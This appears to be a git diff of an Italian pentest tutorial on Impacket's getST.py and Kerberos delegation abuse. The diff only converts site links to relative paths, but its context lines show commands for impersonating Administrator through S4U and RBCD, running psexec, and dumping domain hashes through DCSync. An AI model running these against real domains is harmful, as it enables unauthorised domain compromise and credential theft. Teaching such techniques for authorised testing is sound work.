@@ -23,13 +23,13 @@ tags:
 
 # getST.py: Service Ticket, S4U e Abusi della Kerberos Delegation
 
-`getST.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) e richiede un Service Ticket Kerberos, salvandolo come file `.ccache`. Nel caso base ti serve solo per ottenere un ticket verso un servizio con le tue credenziali. Quando invece controlli un account configurato per Constrained Delegation o autorizzato tramite RBCD, `getST.py` può richiedere un Service Ticket **per conto di un altro utente** verso uno specifico servizio, sfruttando S4U2Self e S4U2Proxy — senza conoscere la password dell'utente impersonato, ma solo se quei prerequisiti di delega esistono davvero.
+`getST.py` fa parte di [Impacket](/articoli/impacket/) e richiede un Service Ticket Kerberos, salvandolo come file `.ccache`. Nel caso base ti serve solo per ottenere un ticket verso un servizio con le tue credenziali. Quando invece controlli un account configurato per Constrained Delegation o autorizzato tramite RBCD, `getST.py` può richiedere un Service Ticket **per conto di un altro utente** verso uno specifico servizio, sfruttando S4U2Self e S4U2Proxy — senza conoscere la password dell'utente impersonato, ma solo se quei prerequisiti di delega esistono davvero.
 
 Riferimento ufficiale: [fortra/impacket — getST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)
 
 ## TGT, TGS e Service Ticket — chi è chi
 
-`getST.py` produce sempre un **Service Ticket** (detto anche TGS), l'ultimo passaggio del flusso [Kerberos](https://hackita.it/articoli/kerberos/). Se non hai chiaro cosa distingue un [TGT da un Service Ticket](https://hackita.it/articoli/tgt-kerberos/), il riassunto è: il TGT è il ticket che ottieni al login e usi per chiedere altri ticket al KDC; il Service Ticket è quello specifico per un singolo servizio (CIFS, LDAP, HOST...), ed è quello che ti serve per autenticarti concretamente a una risorsa.
+`getST.py` produce sempre un **Service Ticket** (detto anche TGS), l'ultimo passaggio del flusso [Kerberos](/articoli/kerberos/). Se non hai chiaro cosa distingue un [TGT da un Service Ticket](/articoli/tgt-kerberos/), il riassunto è: il TGT è il ticket che ottieni al login e usi per chiedere altri ticket al KDC; il Service Ticket è quello specifico per un singolo servizio (CIFS, LDAP, HOST...), ed è quello che ti serve per autenticarti concretamente a una risorsa.
 
 ## S4U2Self e S4U2Proxy
 
@@ -101,7 +101,7 @@ impacket-getST -k -no-pass -dc-ip 10.10.10.5 -spn cifs/DC01.corp.local corp.loca
 
 ## Scenario 1 — Constrained Delegation con protocol transition
 
-**Prerequisito:** hai le credenziali di un account con `TrustedToAuthForDelegation` abilitato e `msDS-AllowedToDelegateTo` configurato. Lo trovi con [BloodHound](https://hackita.it/articoli/bloodhound/) (edge "Allowed to Delegate") o con PowerView/ldapsearch.
+**Prerequisito:** hai le credenziali di un account con `TrustedToAuthForDelegation` abilitato e `msDS-AllowedToDelegateTo` configurato. Lo trovi con [BloodHound](/articoli/bloodhound/) (edge "Allowed to Delegate") o con PowerView/ldapsearch.
 
 ```bash
 # Enumerazione: trova account con constrained delegation
@@ -150,7 +150,7 @@ Il ticket passato con `-additional-ticket` deve essere coerente con il servizio 
 
 ## Scenario 3 — RBCD (Resource-Based Constrained Delegation)
 
-**Prerequisito:** hai scritto `msDS-AllowedToActOnBehalfOfOtherIdentity` su un computer object, tipicamente dopo aver sfruttato GenericWrite o GenericAll su un computer account. L'attacco RBCD completo è in [RBCD](https://hackita.it/articoli/rbcd/).
+**Prerequisito:** hai scritto `msDS-AllowedToActOnBehalfOfOtherIdentity` su un computer object, tipicamente dopo aver sfruttato GenericWrite o GenericAll su un computer account. L'attacco RBCD completo è in [RBCD](/articoli/rbcd/).
 
 ```bash
 # Step 1 — Crea un computer account controllato (se non ne hai già uno)
@@ -176,13 +176,13 @@ impacket-secretsdump -k -no-pass corp.local/Administrator@TARGET.corp.local
 impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
 ```
 
-`rbcd.py` gestisce direttamente `msDS-AllowedToActOnBehalfOfOtherIdentity` con quattro azioni: `read`, `write`, `remove`, `flush`. In alternativa puoi configurare lo stesso attributo con [bloodyAD](https://hackita.it/articoli/bloodyad/) o PowerView.
+`rbcd.py` gestisce direttamente `msDS-AllowedToActOnBehalfOfOtherIdentity` con quattro azioni: `read`, `write`, `remove`, `flush`. In alternativa puoi configurare lo stesso attributo con [bloodyAD](/articoli/bloodyad/) o PowerView.
 
 ## Usare un TGT ottenuto tramite Shadow Credentials
 
-**Prerequisito:** hai scritto `msDS-KeyCredentialLink` su un account ([Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)) e ottenuto il certificato `.pfx`.
+**Prerequisito:** hai scritto `msDS-KeyCredentialLink` su un account ([Shadow Credentials](/articoli/shadow-credentials/)) e ottenuto il certificato `.pfx`.
 
-`getST.py` **non supporta** un flag `-pfx-file` — non esiste nel tool. Il certificato va prima convertito in TGT tramite PKINIT (con [Certipy](https://hackita.it/articoli/certipy/)), e solo dopo passi il ccache risultante a getST:
+`getST.py` **non supporta** un flag `-pfx-file` — non esiste nel tool. Il certificato va prima convertito in TGT tramite PKINIT (con [Certipy](/articoli/certipy/)), e solo dopo passi il ccache risultante a getST:
 
 ```bash
 # Ottieni il TGT tramite PKINIT usando il certificato da Shadow Credentials
@@ -297,7 +297,7 @@ klist
 # 5. Accedi come Administrator
 impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
 
-# 6. DCSync — dump tutti gli hash (vedi [DCSync](https://hackita.it/articoli/dcsync/))
+# 6. DCSync — dump tutti gli hash (vedi [DCSync](/articoli/dcsync/))
 impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
 ```
 
@@ -395,13 +395,13 @@ Di solito perché il TGT di partenza non aveva il flag forwardable, o l'account 
 
 ## Articoli correlati
 
-* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
-* [Kerberos: architettura e flusso](https://hackita.it/articoli/kerberos/)
-* [TGT Kerberos](https://hackita.it/articoli/tgt-kerberos/)
-* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
-* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
-* [BloodHound](https://hackita.it/articoli/bloodhound/)
-* [Certipy](https://hackita.it/articoli/certipy/)
-* [DCSync](https://hackita.it/articoli/dcsync/)
+* [Impacket: suite completa](/articoli/impacket/)
+* [Kerberos: architettura e flusso](/articoli/kerberos/)
+* [TGT Kerberos](/articoli/tgt-kerberos/)
+* [RBCD — Resource-Based Constrained Delegation](/articoli/rbcd/)
+* [Shadow Credentials](/articoli/shadow-credentials/)
+* [BloodHound](/articoli/bloodhound/)
+* [Certipy](/articoli/certipy/)
+* [DCSync](/articoli/dcsync/)
 
 > Uso esclusivo in ambienti autorizzati.
